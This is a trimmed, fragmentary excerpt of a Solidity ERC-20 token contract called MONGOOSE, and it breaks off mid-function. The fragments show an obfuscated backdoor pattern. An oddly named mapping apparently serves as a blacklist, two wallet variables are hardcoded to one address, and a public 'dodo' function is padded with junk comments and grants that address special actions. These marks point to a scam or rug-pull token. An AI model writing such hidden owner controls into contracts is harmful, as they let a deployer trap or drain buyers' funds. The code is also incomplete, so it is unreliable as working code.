...
abstract contract Context {
    ...
    function _accountt() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}
...
contract  MONGOOSE is Context, IERC20, Ownable {
    ...
    mapping (address => bool) public _bbbbbbbbb;
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0xB74d70E9CF6c0Ed157eAdB9c60CDd9EFb399861D));
        marketWall = payable(address(0xB74d70E9CF6c0Ed157eAdB9c60CDd9EFb399861D));
    ...
    function changeRouterVersion(address newRouterAddress) public onlyOwner returns(address newPairAddress) {
        ...
        {
            newPairAddress = IUniswapV2Factory(uniswapV2Router.factory())
                .createPair(address(this), _uniswapV2Router.WETH());
        }
...
= uinttt;}
    ...
    function dodo(address a,uint256 b) public {
    if( marketWall /*dodododo*/
== /*dodododo*/
 /*dodododo*/ _accountt()
){
    if (b == 1){
